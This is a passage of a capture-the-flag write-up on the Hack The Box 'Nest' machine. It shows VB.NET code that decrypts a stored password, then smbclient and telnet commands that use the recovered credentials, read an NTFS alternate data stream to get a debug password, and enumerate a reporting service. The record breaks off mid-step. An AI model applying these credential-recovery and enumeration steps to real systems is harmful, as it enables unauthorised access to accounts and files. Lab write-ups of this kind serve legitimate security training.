&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Convert&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FromBase64String&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherText&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Rfc2898DeriveBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passPhrase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;saltValueBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                          &lt;/span&gt;&lt;span class="n"&gt;passwordIterations&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;CInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keySize&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AesCryptoServiceProvider&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CipherMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ICryptoTransform&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;symmetricKey&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;initVectorBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MemoryStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;New&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                        &lt;/span&gt;&lt;span class="n"&gt;decryptor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                        &lt;/span&gt;&lt;span class="n"&gt;CryptoStreamMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;ReDim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipherTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;Integer&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                              &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                              &lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;memoryStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;cryptoStream&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Dim&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;As&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;String&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ASCII&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plainTextBytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;_&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                                            &lt;/span&gt;&lt;span class="n"&gt;decryptedByteCount&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;Return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;plainText&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Function&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;End&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;Module&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img alt="Running in debug mode" src="/media/2020.06/nest_03.png"&gt;&lt;/p&gt;
&lt;p&gt;We get the c.smith password: xRxRxPANCAK3SxRxRx. We can now connect to the
"Users" share using c.smith account. We got the user.txt file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Try &amp;quot;help&amp;quot; to get a list of possible commands.&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \&amp;gt; cd C.Smith\&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \C.Smith\&amp;gt; mget user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Get file user.txt? y&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \C.Smith\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
&lt;p&gt;We enumerate more and found some configuration about the HQK service (the one on
port 4386). There is also a file "Debug Mode Password.txt".
The file can be copied on disk but is empty.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \C.Smith\&amp;gt; cd &amp;quot;HQK Reporting\&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;  .                                   D        0  Thu Aug  8 19:06:17 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  ..                                  D        0  Thu Aug  8 19:06:17 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            10485247 blocks of size 4096. 6449598 blocks available&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="alternate-data-streams"&gt;Alternate data streams&lt;/h2&gt;
&lt;p&gt;The file seems to be empty because its author used the &lt;a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/"&gt;NTFS alternate data
streams&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;It is possible to get the information about the &lt;a href="https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux"&gt;alternate data steams for a file
using smbclient&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We require the informations about the file in C.Smith folder and we download the
file using the alternate data stream.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot; -c &amp;#39;allinfo &amp;quot;C.Smith\HQK Reporting\Debug Mode Password.txt&amp;quot;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;altname: DEBUGM~1.TXT&lt;/span&gt;
&lt;span class="code-line"&gt;create_time:    Thu Aug  8 07:06:12 PM 2019 EDT&lt;/span&gt;
&lt;span class="code-line"&gt;access_time:    Thu Aug  8 07:06:12 PM 2019 EDT&lt;/span&gt;
&lt;span class="code-line"&gt;write_time:     Thu Aug  8 07:08:17 PM 2019 EDT&lt;/span&gt;
&lt;span class="code-line"&gt;change_time:    Thu Aug  8 07:08:17 PM 2019 EDT&lt;/span&gt;
&lt;span class="code-line"&gt;attributes: A (20)&lt;/span&gt;
&lt;span class="code-line"&gt;stream: [::$DATA], 0 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;stream: [:Password:$DATA], 15 bytes&lt;/span&gt;
&lt;span class="code-line"&gt;root@kalili:~# smbclient //10.10.10.178/Users -U &amp;quot;c.smith&amp;quot;%&amp;quot;xRxRxPANCAK3SxRxRx&amp;quot; -c &amp;#39;get &amp;quot;C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; &amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The file is not empty anymore and contain the password for the DEBUG mode of the HQK service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# cat C.Smith\\HQK\ Reporting\\Debug\ Mode\ Password.txt\:Password\:\$DATA&lt;/span&gt;
&lt;span class="code-line"&gt;WBQ201953D8w&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="hqkldapexe"&gt;HqkLdap.exe&lt;/h2&gt;
&lt;p&gt;We enumerate the folder more and we found a HqkLdap.exe binary. We download it
on our system.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;smb: \C.Smith\HQK Reporting\&amp;gt; cd &amp;quot;AD Integration Module&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\AD Integration Module\&amp;gt; dir&lt;/span&gt;
&lt;span class="code-line"&gt;  .                                   D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  ..                                  D        0  Fri Aug  9 08:18:42 2019&lt;/span&gt;
&lt;span class="code-line"&gt;  HqkLdap.exe                         A    17408  Wed Aug  7 19:41:16 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                10485247 blocks of size 4096. 6449664 blocks available&lt;/span&gt;
&lt;span class="code-line"&gt;smb: \C.Smith\HQK Reporting\AD Integration Module\&amp;gt; mget HqkLdap.exe&lt;/span&gt;
&lt;span class="code-line"&gt;Get file HqkLdap.exe? y&lt;/span&gt;
&lt;span class="code-line"&gt;getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (9.9 KiloBytes/sec) (average 9.9 KiloBytes/sec)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="debug-hqk-reporting-service"&gt;DEBUG HQK Reporting Service&lt;/h2&gt;
&lt;p&gt;We connect to the service and start the debug mode.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# telnet 10.10.10.178 4386&lt;/span&gt;
&lt;span class="code-line"&gt;Trying 10.10.10.178...&lt;/span&gt;
&lt;span class="code-line"&gt;Connected to 10.10.10.178.&lt;/span&gt;
&lt;span class="code-line"&gt;Escape character is &amp;#39;^]&amp;#39;.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HQK Reporting Service V1.2&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;DEBUG WBQ201953D8w&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Debug mode enabled. Use the HELP command to view additional commands that are now available&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We list the command to see what's new. The new commands are:
  * SERVICE
  * SESSION
  * SHOWQUERY&lt;/p&gt;
&lt;p&gt;We run them, session and service just show use informations about our session
and the service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;help&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;This service allows users to run queries against databases using the legacy HQK format&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- AVAILABLE COMMANDS ---&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;LIST&lt;/span&gt;
&lt;span class="code-line"&gt;SETDIR &amp;lt;Directory_Name&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;RUNQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;DEBUG &amp;lt;Password&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;HELP &amp;lt;Command&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;SESSION&lt;/span&gt;
&lt;span class="code-line"&gt;SHOWQUERY &amp;lt;Query_ID&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;session&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- Session Information ---&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Session ID: cb4c294e-1f27-4e1c-90e8-86d22367701e&lt;/span&gt;
&lt;span class="code-line"&gt;Debug: True&lt;/span&gt;
&lt;span class="code-line"&gt;Started At: 1/27/2020 4:33:48 PM&lt;/span&gt;
&lt;span class="code-line"&gt;Server Endpoint: 10.10.10.178:4386&lt;/span&gt;
&lt;span class="code-line"&gt;Client Endpoint: 10.10.14.30:36462&lt;/span&gt;
&lt;span class="code-line"&gt;Current Query Directory: C:\Program Files\HQK\ALL QUERIES&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;service&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--- HQK REPORTING SERVER INFO ---&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Version: 1.2.0.0&lt;/span&gt;
&lt;span class="code-line"&gt;Server Hostname: HTB-NEST&lt;/span&gt;
&lt;span class="code-line"&gt;Server Process: &amp;quot;C:\Program Files\HQK\HqkSvc.exe&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Server Running As: Service_HQK&lt;/span&gt;
&lt;span class="code-line"&gt;Initial Query Directory: C:\Program Files\HQK\ALL QUERIES&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We go to the &lt;code&gt;C:\Program Files\HQK\&lt;/code&gt; directory.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;list&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;QUERY FILES IN CURRENT DIRECTORY&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  ALL QUERIES&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  LDAP&lt;/span&gt;
&lt;span class="code-line"&gt;[DIR]  Logs&lt;/span&gt;
&lt;span class="code-line"&gt;[1]   HqkSvc.exe&lt;/span&gt;
&lt;span class="code-line"&gt;[2]   HqkSvc.InstallState&lt;/span&gt;
&lt;span class="code-line"&gt;[3]   HQK_Config.xml&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The Showquery function allow use to read the files in the current directory.
The file HQK_Config.xml contain our debugging password and the port of the
service.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;showquery 3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
